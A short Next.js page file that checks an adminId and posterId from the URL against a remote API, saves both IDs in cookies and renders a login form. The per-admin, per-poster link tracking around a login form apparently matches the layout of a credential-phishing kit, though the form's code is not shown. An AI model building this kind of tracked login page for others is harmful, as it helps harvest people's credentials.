import LoginForm from "../../components/LoginForm";
import Header from "../../components/Header";
import Footer from "../../components/Footer";
import { API_URL, site } from "../../config";
import { useEffect } from "react";
import Cookies from "js-cookie";

export default function MainPage({ adminId, posterId }) {
  useEffect(() => {
    Cookies.set("adminId", adminId);
    Cookies.set("posterId", posterId);
  }, []);

  return (
    <div className="">
      <Header />
      {/* <Test /> */}
      <LoginForm />

      <Footer />
    </div>
  );
}

export async function getServerSideProps({ query: { adminId, posterId } }) {
  const url = `${API_URL}/${site}/${adminId}/${posterId}`;

  // console.log(url);

  const res = await fetch(url);
  const data = await res.json();

  if (data?.success !== "exists") {
    return {
      notFound: true,
    };
  }

  return {
    props: { adminId, posterId },
  };
}
